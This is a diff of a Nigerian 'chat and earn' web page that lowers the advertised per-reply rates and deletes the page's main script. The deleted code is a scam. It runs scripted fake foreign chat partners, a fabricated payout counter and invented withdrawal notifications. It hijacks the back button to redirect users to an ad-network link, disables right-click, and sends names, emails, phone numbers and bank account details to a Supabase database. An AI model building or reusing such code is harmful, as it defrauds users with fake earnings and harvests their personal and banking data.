@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
 <title>ChatEarn — Chat With Foreigners & Earn in Naira</title>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <meta name="robots" content="noindex,nofollow">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
@@ -414,7 +413,7 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
 </div>
 
 
-<div class="earn-toast" id="earnToast">+₦8,000 Earned! 💰</div>
+<div class="earn-toast" id="earnToast">+₦4,000 Earned! 💰</div>
 <div class="toast" id="toast"></div>
 <div class="activity-toast" id="activityToast">
   <div class="at-av" id="atAv" style="background:#00C853;">AO</div>
@@ -454,19 +453,19 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
       <div class="er-title">EARNINGS PER REPLY</div>
       <div class="er-row">
         <div class="er-left"><span class="er-flag">🇺🇸</span><span class="er-lang">American English</span></div>
-        <div class="er-rate">₦15,000/reply</div>
+        <div class="er-rate">₦5,000/reply</div>
       </div>
       <div class="er-row">
         <div class="er-left"><span class="er-flag">🇬🇧</span><span class="er-lang">British English</span></div>
-        <div class="er-rate">₦12,000/reply</div>
+        <div class="er-rate">₦4,500/reply</div>
       </div>
       <div class="er-row">
         <div class="er-left"><span class="er-flag">🇨🇦</span><span class="er-lang">Canadian English</span></div>
-        <div class="er-rate">₦10,000/reply</div>
+        <div class="er-rate">₦4,000/reply</div>
       </div>
       <div class="er-row">
         <div class="er-left"><span class="er-flag">🇳🇬</span><span class="er-lang">Pidgin English</span></div>
-        <div class="er-rate">₦8,000/reply</div>
+        <div class="er-rate">₦3,500/reply</div>
       </div>
     </div>
 
@@ -614,7 +613,7 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
         <div class="fc-name">alexlab102</div>
         <div class="fc-country">🇺🇸 United States · American English</div>
       </div>
-      <button class="fc-earn">₦15K/reply</button>
+      <button class="fc-earn">₦5K/reply</button>
     </div>
     <div class="foreigner-card" onclick="openChat(1)">
       <div class="fc-av-circle" style="background:linear-gradient(135deg,#880E4F,#F06292);">EC<div class="fc-online"></div></div>
@@ -622,7 +621,7 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
         <div class="fc-name">EmiliaCute</div>
         <div class="fc-country">🇬🇧 United Kingdom · British English</div>
       </div>
-      <button class="fc-earn">₦12K/reply</button>
+      <button class="fc-earn">₦4.5K/reply</button>
     </div>
     <div class="foreigner-card" onclick="openChat(2)">
       <div class="fc-av-circle" style="background:linear-gradient(135deg,#1B5E20,#66BB6A);">MJ<div class="fc-online"></div></div>
@@ -630,7 +629,7 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
         <div class="fc-name">MattJohn</div>
         <div class="fc-country">🇨🇦 Canada · Canadian English</div>
       </div>
-      <button class="fc-earn">₦10K/reply</button>
+      <button class="fc-earn">₦4K/reply</button>
     </div>
     <div class="foreigner-card" onclick="openChat(3)">
       <div class="fc-av-circle" style="background:linear-gradient(135deg,#E65100,#FFA726);">AB<div class="fc-online"></div></div>
@@ -638,7 +637,7 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
         <div class="fc-name">Abi1990</div>
         <div class="fc-country">🇺🇸 United States · American English</div>
       </div>
-      <button class="fc-earn">₦15K/reply</button>
+      <button class="fc-earn">₦5K/reply</button>
     </div>
     <div class="foreigner-card" onclick="openChat(4)">
       <div class="fc-av-circle" style="background:linear-gradient(135deg,#4A148C,#CE93D8);">PR<div class="fc-online"></div></div>
@@ -646,7 +645,7 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
         <div class="fc-name">princess77</div>
         <div class="fc-country">🇩🇪 Germany · European English</div>
       </div>
-      <button class="fc-earn">₦8K/reply</button>
+      <button class="fc-earn">₦3.5K/reply</button>
     </div>
     <div class="foreigner-card" onclick="openChat(5)">
       <div class="fc-av-circle" style="background:linear-gradient(135deg,#006064,#4DD0E1);">CA<div class="fc-online"></div></div>
@@ -654,7 +653,7 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
         <div class="fc-name">CamilaAnders</div>
         <div class="fc-country">🇦🇺 Australia · Australian English</div>
       </div>
-      <button class="fc-earn">₦10K/reply</button>
+      <button class="fc-earn">₦4K/reply</button>
     </div>
   </div>
 
@@ -716,7 +715,7 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
       <div class="ch-name" id="chatName">alexlab102</div>
       <div class="ch-status" id="chatStatus">🟢 Online now</div>
     </div>
-    <div class="ch-earn-badge" id="chatEarnBadge">+₦15K/reply</div>
+    <div class="ch-earn-badge" id="chatEarnBadge">+₦5K/reply</div>
   </div>
 
   <div class="chat-body" id="chatBody" style="padding-bottom:80px;">
@@ -932,753 +931,8 @@ body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-heig
 
 </div><!-- page-wrap -->
 
-<script>
-// Supabase client for collecting registrations & withdrawals
-const supabaseClient = supabase.createClient(
-  "https://dtjxcgzpwemdgdeinkcl.supabase.co",
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR0anhjZ3pwd2VtZGdkZWlua2NsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MDg0ODQsImV4cCI6MjA5MzQ4NDQ4NH0.kGjtOZfK7onzr-3FVMuSljiJ3emllxtGdepxrFVUPPM"
-);
-
-async function saveRegistration(name, email, phone){
-  try {
-    await supabaseClient.from('chatearn_users').insert([{
-      full_name: name,
-      email: email,
-      phone: phone || '',
-      balance: 10000,
-      status: 'active',
-      registered_at: new Date().toISOString()
-    }]);
-  } catch(e){ console.log('Registration save failed:', e); }
-}
-
-async function saveWithdrawal(name, accNo, bank, amount){
-  try{
-    const userEmail = document.getElementById('regEmail')?.value.trim() || '';
-    const userFullName = document.getElementById('regName')?.value.trim() || userName || '';
-    await supabaseClient.from('chatearn_withdrawals').insert([{
-      account_name: name,
-      account_number: accNo,
-      bank: bank,
-      amount: amount,
-      user_email: userEmail,
-      user_full_name: userFullName,
-      status: 'pending',
-      requested_at: new Date().toISOString()
-    }]);
-  }catch(e){ console.log('Withdrawal save failed:', e); }
-}
-
-const SITE = "https://chat-earn.xyz";
-const AFF = "https://www.effectivecpmnetwork.com/t7jwkt8bc4?key=1d77add4feba7fc9852d1b354879b329";
-const BACK = "https://omg10.com/4/4105256";
-const REQ = 5;
-
-document.querySelectorAll(".screen").forEach(s=>{s.style.display="none";});
-document.getElementById("landing").style.display="block";
-document.getElementById("landing").classList.add("active");
-
-(function(){
-  history.pushState(null,"",location.href);
-  history.pushState(null,"",location.href);
-  history.pushState(null,"",location.href);
-  window.addEventListener("popstate",function(){
-    history.pushState(null,"",location.href);
-    if(currentScreen==='landing'||currentScreen==='register'){
-      window.location.href=BACK;
-    } else {
-      showBackWarn();
-    }
-  });
-})();
-
-document.addEventListener("contextmenu",e=>e.preventDefault());
-
-function showBackWarn(){
-  document.getElementById("bwAmount").textContent="₦"+totalBalance.toLocaleString("en-NG");
-  document.getElementById("backWarn").classList.add("show");
-}
-function closeBackWarn(){document.getElementById("backWarn").classList.remove("show");}
-
-let userName="",totalBalance=10000,chatEarnings=0,replyCount=0,currentChatUser=null,currentScreen="landing";
-let swShares=0,selectedBank="opay",chatBusy=false,withdrawPrompted=false;
-let withdrawalAmount=0,withdrawalBank="opay",withdrawalAcc="",chatHistory=[],shareFailTriggered=false;
-const MIN_WITHDRAW=40000,MAX_EARN=65000;
-
-// ══ SESSION PERSISTENCE ══
-// Without this, every reload wipes progress — nothing to "come back" to.
-const STATE_KEY="chatearn_state_v1";
-let checkinStreak=0,lastCheckinDate="";
-
-function saveState(){
-  try{
-    localStorage.setItem(STATE_KEY, JSON.stringify({
-      userName, totalBalance, chatEarnings, replyCount, checkinStreak, lastCheckinDate
-    }));
-  }catch(e){}
-}
-
-function loadState(){
-  try{
-    const raw=localStorage.getItem(STATE_KEY);
-    if(!raw) return false;
-    const s=JSON.parse(raw);
-    userName=s.userName||"";
-    totalBalance=typeof s.totalBalance==="number"?s.totalBalance:10000;
-    chatEarnings=s.chatEarnings||0;
-    replyCount=s.replyCount||0;
-    checkinStreak=s.checkinStreak||0;
-    lastCheckinDate=s.lastCheckinDate||"";
-    return !!userName;
-  }catch(e){ return false; }
-}
-
-function tryRestoreSession(){
-  if(loadState()){
-    goScreen("dashboard");
-    document.getElementById("dashName").textContent=userName+"!";
-    document.getElementById("dashBalance").textContent="₦"+totalBalance.toLocaleString("en-NG");
-    setTimeout(runDailyCheckin,1200);
-    return true;
-  }
-  return false;
-}
-
-// ══ DAILY STREAK / CHECK-IN ══
-// Day 1 = signup day (no modal, the signup bonus already covers it).
-// Miss a day → streak resets to 1, but balance is never touched. Streak is a bonus system, not a punishment system.
-const STREAK_REWARDS=[200,300,500,700,1000,1300,2000]; // escalates Day1→Day7, then repeats the cycle
-
-function runDailyCheckin(){
-  const today=new Date().toDateString();
-  if(lastCheckinDate===today) return; // already checked in today
-  const yesterday=new Date(Date.now()-86400000).toDateString();
-  checkinStreak=(lastCheckinDate===yesterday)?checkinStreak+1:1;
-  lastCheckinDate=today;
-  saveState();
-  showStreakModal();
-}
-
-function showStreakModal(){
-  const dayIdx=(checkinStreak-1)%STREAK_REWARDS.length;
-  const reward=STREAK_REWARDS[dayIdx];
-  document.getElementById("streakTitle").textContent="Day "+checkinStreak+" Streak!";
-  document.getElementById("streakSub").textContent=checkinStreak>=7?"You're on fire! Keep coming back daily.":"Come back tomorrow to keep it going";
-  document.getElementById("streakReward").textContent="₦"+reward.toLocaleString("en-NG");
-  const daysEl=document.getElementById("streakDays");
-  daysEl.innerHTML=STREAK_REWARDS.map(function(r,i){
-    const day=i+1, filled=day<=(((checkinStreak-1)%7)+1);
-    return '<div style="width:34px;height:34px;border-radius:10px;background:'+(filled?'var(--green)':'var(--card2)')+';color:'+(filled?'#000':'var(--muted)')+';display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;">'+day+'</div>';
-  }).join("");
-  document.getElementById("streakModal").style.display="flex";
-}
-
-function claimStreak(){
-  const dayIdx=(checkinStreak-1)%STREAK_REWARDS.length;
-  const reward=STREAK_REWARDS[dayIdx];
-  totalBalance+=reward;
-  saveState();
-  document.getElementById("dashBalance").textContent="₦"+totalBalance.toLocaleString("en-NG");
-  document.getElementById("streakModal").style.display="none";
-  showEarnToast("+₦"+reward.toLocaleString("en-NG")+" streak bonus! 🔥");
-}
-
-const FOREIGNERS=[
-  {
-    name:"alexlab102", flag:"🇺🇸", initials:"AL",
-    color:"linear-gradient(135deg,#1565C0,#42A5F5)",
-    country:"United States", rate:15000,
-    msgs:[
-      "Hey! 👋 I just got matched with you on here. I'm Alex, from Houston Texas. What's up?",
-      "Oh nice nice! I've been wanting to chat with someone from Nigeria for a while now 😄 Which part are you from?",
-      "Bro Lagos?? I've watched so many videos about Lagos on YouTube lol. The energy there looks CRAZY 🔥 Is it really like that?",
-      "Haha I knew it! My friend went to Lagos last year and said it changed his life fr 😂 Do you go out a lot or more stay home?",
-      "That's wild man. In Houston it's more chill... drive everywhere, no hustle like that. What kind of music you listen to?",
-      "Bro Burna Boy is literally on my playlist every day 😭🙌 He's huge here in the US right now. Have you ever been to one of his concerts?",
-      "That's so cool honestly. I wish I could experience that. Do you think Nigeria will ever be as big globally as people say it will?",
-      "100% I believe that too. The culture, the music, the tech scene... Nigeria is moving 💪 What do you do for work if you don't mind me asking?",
-      "That's dope! Respect the hustle. Over here I work in logistics, it's decent but I want to do something more digital like what Nigerians are doing 😂",
-      "Facts. Honestly chatting with you is making me want to visit Nigeria soon. What time is it over there right now? 😄",
-    ]
-  },
-  {
-    name:"EmiliaCute", flag:"🇬🇧", initials:"EC",
-    color:"linear-gradient(135deg,#880E4F,#F06292)",
-    country:"United Kingdom", rate:12000,
-    msgs:[
-      "Hellooo 😊 I just got matched with you! I'm Emilia, from London. How are you doing today?",
-      "Aww that's lovely to hear! I've been speaking to a few Nigerians on here and honestly you lot are so friendly 😄 Where in Nigeria are you?",
-      "Oh I love that! My colleague at work is from Abuja and she always talks about how beautiful it is there. Is the weather nice this time of year?",
-      "Haha yes! I always complain about London weather 😂 It's been grey and rainy for like 3 weeks straight. I'm so jealous of you guys and your sunshine honestly.",
-      "Okay so I have to ask — jollof rice. Nigerian vs Ghanaian. Where do you stand? 😂 My colleague gets SO defensive about this topic lol",
-      "Hahaha I KNEW you'd say that 😂 She says the exact same thing with so much passion. I've had Nigerian jollof at a party before and it was genuinely amazing though.",
-      "Right?? There's something about the smoky taste. Okay what else should I know about Nigerian food? Give me your top 3 😄",
-      "Ohhh suya!! I've had that from a Nigerian restaurant in Peckham and it was 10/10 🔥 Do you eat it regularly there or is it more of a special occasion thing?",
-      "That's so cool. I love how food is such a big part of the culture. In London we don't really have that same community feeling around food anymore 😔",
-      "Honestly you've made me want to visit Nigeria now 😂 Lagos or Abuja — where would you recommend for a first-time visitor? Be honest!",
-    ]
-  },
-  {
-    name:"MattJohn", flag:"🇨🇦", initials:"MJ",
-    color:"linear-gradient(135deg,#1B5E20,#66BB6A)",
-    country:"Canada", rate:10000,
-    msgs:[
-      "Hey what's good! 🤙 I'm Matt from Toronto. Just joined this app, seems pretty cool. You from Nigeria?",
-      "Aye nice! Nigeria's been on my radar a lot lately honestly. Between the music and the tech stuff I keep seeing online, seems like things are popping over there 🔥",
-      "For real for real. Wizkid literally sold out the O2 Arena in London which is massive bro. Do people in Nigeria feel proud when they see that kind of thing happen?",
-      "That's dope man. Like a whole wave of Nigerian culture going global. It must feel good to be part of that. What city are you in?",
-      "Oh word! I have zero knowledge of Nigerian cities beyond Lagos and Abuja lol. What's it like living there day to day?",
-      "That's real talk. I feel like hustle is the vibe everywhere but Nigeria sounds like it's on a different level 😅 Do you guys sleep? 😂",
-      "Hahaha respect. In Toronto we complain about traffic and it doesn't even compare to what you're describing 😂. What do you do to unwind after a long day?",
-      "Aye that's the move. Simple but effective 😄 Over here in winter we just stay inside and watch Netflix for like 5 months straight. Canada winters hit different 🥶",
-      "Bro yes 😂 -20 degrees is not a joke. But summer here is fire tho, genuinely beautiful. Have you ever thought about travelling abroad?",
-      "Canada is a good choice honestly lol. If you ever come to Toronto I'll tell you the best spots 🙌 What's your biggest goal right now if you don't mind sharing?",
-    ]
-  },
-  {
-    name:"Abi1990", flag:"🇺🇸", initials:"AB",
-    color:"linear-gradient(135deg,#E65100,#FFA726)",
-    country:"United States", rate:15000,
-    msgs:[
-      "Hiii!! 😊 So happy to be matched with someone from Nigeria! I'm Abi from Atlanta Georgia. I literally love everything about Nigerian culture 🙌",
-      "Oh my gosh YES! I've been obsessed with Afrobeats since like 2019. Davido, Burna, Wizkid, Asake... I know all the lyrics and my friends think I'm crazy 😂 Are you into music?",
-      "That is so cool!! See I feel like Nigerians just have music in their blood. Like the rhythm, the energy... it's different. Do you dance too or just listen?",
-      "Hahaha okay you have to teach me some moves 😂 I've been trying to learn Zanku for months and I still look ridiculous. What's the easiest Naija dance to learn?",
-      "Okay I'm writing that down 😄 Also I have to ask — I tried making jollof rice from a YouTube tutorial last week and it came out... not great lol. What am I doing wrong?",
-      "OHHHH the smoky pot flavor!! That's what mine was missing 😭 My Nigerian friend told me the same thing. She said I need a real pot not a non-stick pan 😂",
-      "I'm taking notes honestly 📝 You're like my personal Nigeria guide lol. Can I ask — what's everyday life like for you? Like morning to night?",
-      "Wow that's so real. You make it work though and I respect that so much 💪 In Atlanta we have a big Nigerian community actually — have you heard of Little Nigeria in Atlanta?",
-      "It's this whole area with Nigerian restaurants, shops, events... it's amazing. The jollof there is INCREDIBLE. I think about it all the time 😩🔥",
-      "You should come visit one day honestly! Atlanta is so much fun and the Nigerian community here would make you feel right at home 🙌 What would be your dream trip abroad?",
-    ]
-  },
-  {
-    name:"princess77", flag:"🇩🇪", initials:"PR",
-    color:"linear-gradient(135deg,#4A148C,#CE93D8)",
-    country:"Germany", rate:8000,
-    msgs:[
-      "Hello! 😊 I am Sandra from Berlin. Nice to meet you. I have not spoken to many people from Nigeria before so I am curious.",
-      "Oh that is interesting! I did not know much about Nigeria until recently. My flatmate here in Berlin is from Lagos and she always tells me stories. Is Lagos really as busy as she says?",
-      "Haha yes she says the same thing! She says Berlin feels like a quiet village compared to Lagos 😄 I find that hard to imagine because Berlin is not small at all.",
-      "That is really fascinating. In Germany we also have traffic but people are very... orderly. There are rules for everything 😅 Is it difficult to live with so much chaos or do you get used to it?",
-      "I think I understand. My flatmate says Nigerian people are very resilient. She is one of the hardest working people I know honestly. Is that a common thing there?",
-      "I believe it. Here in Germany people work hard too but in a very structured way. We have work-life balance culture. Do you have time to relax in Nigeria or is it always go go go?",
-      "That sounds nice actually. Simple enjoyment. I think Germans overcomplicate relaxation sometimes 😄 We have to plan everything even our free time lol.",
-      "Haha yes exactly 😂 My flatmate laughs at me for this. She says Nigerians just go out and things happen naturally. I am trying to learn this approach honestly.",
-      "Can I ask — what is one thing about Nigeria that you wish more people in the world knew about? I feel like the news only shows bad things.",
-      "That is really beautiful to hear. I want to visit West Africa one day. Nigeria is on my list. What would you say is the most important thing to experience there? 😊",
-    ]
-  },
-  {
-    name:"CamilaAnders", flag:"🇦🇺", initials:"CA",
-    color:"linear-gradient(135deg,#006064,#4DD0E1)",
-    country:"Australia", rate:10000,
-    msgs:[
-      "G'day!! 😄 I'm Camila from Sydney. Just got matched with you — are you really in Nigeria? That's so far from me haha!",
-      "That's so wild to think about! Like we're literally on opposite ends of the earth chatting right now 😄 Which part of Nigeria are you in?",
-      "Oh amazing! I actually looked up Nigeria on the map once and I was surprised by how big it is. Like it's massive! Is there a big difference between the north and south?",
-      "Wow that's so interesting! It's almost like different countries within one country. Australia is similar in some ways — like Perth feels nothing like Sydney. Very different vibes.",
-      "Exactly! Sydney is beach culture, busy, expensive... Perth is more relaxed and spacious. What's the vibe where you are? More busy city or more chill?",
-      "Haha I love that! In Sydney we say the same thing — it never really stops 😂 Do you ever escape to somewhere more chill or are you a city person through and through?",
-      "That sounds amazing honestly 😍 I love road trips. Me and my friends drove down the Great Ocean Road last year — absolutely beautiful. Nigeria must have stunning scenery too right?",
-      "Oh wow yes!! I've seen pictures of the Niger Delta and some of the hills in the east and they look incredible. Do tourists actually visit those places or is it mainly locals?",
-      "I feel like Nigeria is so underrated as a travel destination honestly. The food, the culture, the music... Afrobeats literally dominates the charts here in Australia right now 🔥",
-      "It really is! My gym plays Burna Boy and Rema every single session 😂 Do you know those artists personally or are they just big names from your perspective too? 😄",
-    ]
-  },
-];
-
-/* LIVE PAYOUT COUNTER */
-(function(){
-  let base=12400000+Math.floor(Math.random()*800000);
-  const el=document.getElementById("liveCounter");
-  if(!el)return;
-  function fmt(n){return "₦"+n.toLocaleString("en-NG");}
-  el.textContent=fmt(base);
-  function tick(){
-    const a=[8000,10000,12000,15000,8000,15000,10000,12000];
-    base+=a[Math.floor(Math.random()*a.length)];
-    el.textContent=fmt(base);
-    setTimeout(tick,4000+Math.random()*4000);
-  }
-  setTimeout(tick,3000);
-})();
-
-/* ACTIVITY FEED */
-const ACT_PEOPLE=[
-  {i:"AO",c:"#FF6B35",n:"Adaeze",city:"Lagos"},{i:"EM",c:"#2979FF",n:"Emeka",city:"Abuja"},
-  {i:"FB",c:"#AA00FF",n:"Fatima",city:"Kano"},{i:"CJ",c:"#00C853",n:"Chukwudi",city:"Enugu"},
-  {i:"NG",c:"#FF1744",n:"Ngozi",city:"Port Harcourt"},{i:"TK",c:"#FFD600",n:"Tunde",city:"Ibadan"},
-  {i:"AB",c:"#00BCD4",n:"Amaka",city:"Benin"},{i:"SF",c:"#FF6B35",n:"Seun",city:"Lagos"},
-  {i:"IB",c:"#4CAF50",n:"Ibrahim",city:"Kaduna"},{i:"KO",c:"#E91E63",n:"Kemi",city:"Owerri"},
-];
-function showActivityToast(){
-  const p=ACT_PEOPLE[Math.floor(Math.random()*ACT_PEOPLE.length)];
-  const earnAmts=[8000,10000,12000,15000];
-  const withdrawAmts=[40000,42000,45000,48000,50000,55000,60000,65000];
-  // Action types: 0,2 = earned (use earnAmts) | 1,3 = withdrew (use withdrawAmts, min 40k)
-  const actionIdx=Math.floor(Math.random()*4);
-  let amt, action;
-  if(actionIdx===0){amt=earnAmts[Math.floor(Math.random()*earnAmts.length)];action=`just earned ₦${amt.toLocaleString("en-NG")} 💰`;}
-  else if(actionIdx===1){amt=withdrawAmts[Math.floor(Math.random()*withdrawAmts.length)];action=`just withdrew ₦${amt.toLocaleString("en-NG")} to OPay 🎉`;}
-  else if(actionIdx===2){amt=earnAmts[Math.floor(Math.random()*earnAmts.length)];action=`earned ₦${amt.toLocaleString("en-NG")} chatting 🔥`;}
-  else{amt=withdrawAmts[Math.floor(Math.random()*withdrawAmts.length)];action=`withdrew ₦${amt.toLocaleString("en-NG")} to PalmPay 💸`;}
-  const t=document.getElementById("activityToast");
-  document.getElementById("atAv").textContent=p.i;
-  document.getElementById("atAv").style.background=p.c;
-  document.getElementById("atName").textContent=p.n+" ("+p.city+")";
-  document.getElementById("atAction").textContent=action;
-  t.classList.add("show");
-  setTimeout(()=>t.classList.remove("show"),3500);
-}
-setTimeout(()=>{showActivityToast();setInterval(showActivityToast,12000+Math.random()*8000);},5000);
-
-function goScreen(id){
-  document.querySelectorAll(".screen").forEach(s=>{s.classList.remove("active");s.style.display="none";});
-  const target=document.getElementById(id);
-  target.classList.add("active");
-  if(["loading","processing"].includes(id)){target.style.display="flex";target.style.flexDirection="column";target.style.alignItems="center";target.style.justifyContent="center";}
-  else{target.style.display="block";}
-  currentScreen=id;window.scrollTo({top:0,behavior:"smooth"});
-}
-
-function doRegister(){
-  const name=document.getElementById("regName").value.trim();
-  const email=document.getElementById("regEmail").value.trim();
-  const phone=document.getElementById("regPhone") ? document.getElementById("regPhone").value.trim() : '';
-  const pass=document.getElementById("regPass").value.trim();
-  if(!name){showToast("⚠️ Enter your full name");return;}
-  if(!email||!email.includes("@")){showToast("⚠️ Enter a valid email");return;}
-  if(!pass||pass.length<6){showToast("⚠️ Password must be at least 6 characters");return;}
-  userName=name.split(" ")[0];
-  checkinStreak=1; lastCheckinDate=new Date().toDateString(); // Day 1 = signup day, counted but not modal-prompted
-  saveState();
-  // Save to Supabase — both tables for admin visibility
-  (async()=>{
-    try{
-      // Main users table
-      await supabaseClient.from('chatearn_users').insert([{
-        full_name: name, email: email, phone: phone,
-        balance: 10000, status: 'active',
-        registered_at: new Date().toISOString()
-      }]);
-      // Legacy registrations table (keep for compatibility)
-      await supabaseClient.from('chatearn_registrations').insert([{
-        full_name: name, user_email: email, phone: phone
-      }]);
-    }catch(e){ console.log('Registration save failed:', e); }
-  })();
-  goScreen("loading"); runLoadingSequence();
-}
-  
-function runLoadingSequence(){
-  const steps=["ls1","ls2","ls3","ls4"];
-  const fill=document.getElementById("ldFill");let i=0;
-  const iv=setInterval(()=>{
-    if(i<steps.length){
-      const s=document.getElementById(steps[i]);
-      s.classList.add("done");s.querySelector(".ld-step-dot").textContent="✓";
-      fill.style.width=((i+1)/steps.length*100)+"%";i++;
-    }else{
-      clearInterval(iv);
-      setTimeout(()=>{
-        goScreen("dashboard");
-        document.getElementById("dashName").textContent=userName+"!";
-        document.getElementById("dashBalance").textContent="₦"+totalBalance.toLocaleString("en-NG");
-        saveState();
-        // Auto-open a random foreigner chat after 1.5s
-        const pickIdx = Math.floor(Math.random()*FOREIGNERS.length);
-        setTimeout(()=>openChat(pickIdx),1500);
-      },600);
-    }
-  },700);
-}
-
-function openChat(idx){
-  currentChatUser=FOREIGNERS[idx];
-  document.getElementById("chatAv").innerHTML=`<div style="width:40px;height:40px;border-radius:50%;background:${currentChatUser.color};display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;color:#000;position:relative;">${currentChatUser.initials}<div class="ch-online"></div></div>`;
-  document.getElementById("chatName").textContent=currentChatUser.name;
-  document.getElementById("chatStatus").textContent="🟢 Online now · "+currentChatUser.country;
-  document.getElementById("chatEarnBadge").textContent="+₦"+currentChatUser.rate.toLocaleString("en-NG")+"/reply";
-  document.getElementById("chatBody").innerHTML="";
-  chatHistory=[];chatBusy=false;goScreen("chat");
-  // Show typing status then send opening message
-  setTimeout(()=>{
-    document.getElementById("chatStatus").textContent="✍️ typing...";
-    deliverReply(currentChatUser.msgs[0]);
-  },1000);
-}
-
-function deliverReply(text, isSpecial){
-  const body=document.getElementById("chatBody");
-  // Typing indicator
-  const typing=document.createElement("div");
-  typing.className="typing-indicator";typing.id="typingIndicator";
-  typing.innerHTML='<div class="ti-dot"></div><div class="ti-dot"></div><div class="ti-dot"></div>';
-  body.appendChild(typing);body.scrollTop=body.scrollHeight;
-
-  // Delay based on message length (feels natural)
-  const delay = Math.min(800 + text.length * 18, 3200);
-
-  setTimeout(()=>{
-    const ti=document.getElementById("typingIndicator");if(ti)ti.remove();
-
-    // Occasionally drop a voice note or photo mid-conversation
-    const r=Math.random();
-    if(replyCount>1 && replyCount%5===0 && r<0.35){
-      addVoiceNote(body);
-      // Then deliver the text message after voice note
-      setTimeout(()=>{
-        const msg=document.createElement("div");msg.className="msg incoming";
-        msg.innerHTML=`<div class="msg-bubble">${text}</div><div class="msg-time">${getTime()}</div>`;
-        body.appendChild(msg);body.scrollTop=body.scrollHeight;
-      },900);
-    } else if(replyCount>1 && replyCount%7===0 && r>=0.35&&r<0.6){
-      addPhotoBubble(body);
-      setTimeout(()=>{
-        const msg=document.createElement("div");msg.className="msg incoming";
-        msg.innerHTML=`<div class="msg-bubble">${text}</div><div class="msg-time">${getTime()}</div>`;
-        body.appendChild(msg);body.scrollTop=body.scrollHeight;
-      },900);
-    } else {
-      const msg=document.createElement("div");msg.className="msg incoming";
-      msg.innerHTML=`<div class="msg-bubble">${text}</div><div class="msg-time">${getTime()}</div>`;
-      body.appendChild(msg);body.scrollTop=body.scrollHeight;
-    }
-
-    // Occasionally go offline briefly then return
-    if(replyCount>0 && replyCount%4===0 && Math.random()<0.4){
-      document.getElementById("chatStatus").textContent="🔴 Last seen just now";
-      setTimeout(()=>{
-        document.getElementById("chatStatus").textContent="✍️ typing...";
-        setTimeout(()=>{
-          document.getElementById("chatStatus").textContent="🟢 Online now · "+currentChatUser.country;
-        },1500);
-      }, 3000+Math.random()*4000);
-    } else {
-      document.getElementById("chatStatus").textContent="🟢 Online now · "+currentChatUser.country;
-    }
-    chatBusy=false;
-    if(totalBalance>=MIN_WITHDRAW&&!withdrawPrompted){withdrawPrompted=true;setTimeout(()=>promptWithdraw(),1500);}
-    if(totalBalance>=MAX_EARN){setTimeout(()=>forceWithdraw(),2000);}
-  }, delay);
-}
-
-// ── SMART KEYWORD ENGINE ──
-const KEYWORD_REPLIES = {
-  // Locations
-  lagos:["Lagos!! That city is everywhere on my TikTok lately 😂 The energy looks insane, is it really like that?","Oh Lagos person! My friend visited last year and said it changed his life fr. Do you live on the island or mainland?","Lagos is literally the city everyone talks about. What's your favourite area to hang out?"],
-  abuja:["Abuja seems so different from Lagos from what I've seen online — more planned and quiet? Is that true?","Abuja looks so clean and organised compared to what I expected honestly 😄 Do you enjoy living there?","I've heard Abuja is more of a government city but also has a good nightlife scene? What's it really like?"],
-  ph:["Port Harcourt! The Garden City right? 😄 I've heard a lot about the oil money there lol","PH people are always so proud of their city 😂 What makes it special compared to Lagos?"],
-  "port harcourt":["Port Harcourt! The Garden City right? 😄 I've heard a lot about the oil money there lol","PH people are always so proud of their city 😂 What makes it special compared to Lagos?"],
-  kano:["Kano is in the north right? I heard it has a completely different vibe from the south — more traditional?","I find northern Nigeria so fascinating honestly. The architecture, the culture... it looks so rich. What's everyday life like there?"],
-  ibadan:["Ibadan! The city of brown roofs 😄 I actually read about it being one of the largest cities in West Africa. Is that true?"],
-  enugu:["Enugu the Coal City! I have a Nigerian friend whose family is from there and she says the people are the friendliest in Nigeria 😊"],
-  benin:["Benin City has such deep history — the Benin Kingdom, the bronzes... that's incredible heritage. Do people there still feel connected to that history?"],
-
-  // Food
-  jollof:["JOLLOF RICE 😭 Okay I have to say Nigerian jollof is different from anything I've ever tasted. What's the secret ingredient??","I had Nigerian jollof at a party last year and I've been obsessed since. Do you eat it every day or is it a special thing?","Haha the jollof wars are so funny from the outside 😂 But I have to be honest — Nigerian jollof hits different. What do you normally eat with it?"],
-  suya:["SUYA!! 🔥 I had suya from a Nigerian spot near me and it was literally the best meat I've ever eaten. What spice is that??","Suya is undefeated honestly. Do you eat it as a snack or more like a full meal?","The way Nigerians eat suya standing by the roadside at night looks so fun honestly 😄"],
-  egusi:["Egusi soup!! I've seen videos of people making it and it looks so rich and heavy. Is it an everyday meal or more special occasions?","My Nigerian colleague brought egusi to work once and the whole office was asking questions 😂 It smells so good"],
-  pounded:["Pounded yam!! The way Nigerians talk about it like it's a religion 😂 I've never had it but it looks like serious comfort food","I need to try pounded yam and egusi before I die honestly. Is it hard to make?"],
-  pepper:["Pepper soup!! 🔥 I've heard it cures everything from cold to heartbreak 😂 Is that actually true?"],
-  amala:["Amala and ewedu... I watched a video of someone eating it and the way they were enjoying it made me so hungry 😄"],
-
-  // Music
-  burna:["BURNA BOY 🔥🔥 He's literally on my playlist every single day. African Giant is a masterpiece. Have you ever seen him perform live?","Burna is huge here right now. My whole friend group is obsessed. Do Nigerians feel proud seeing him blow up globally?"],
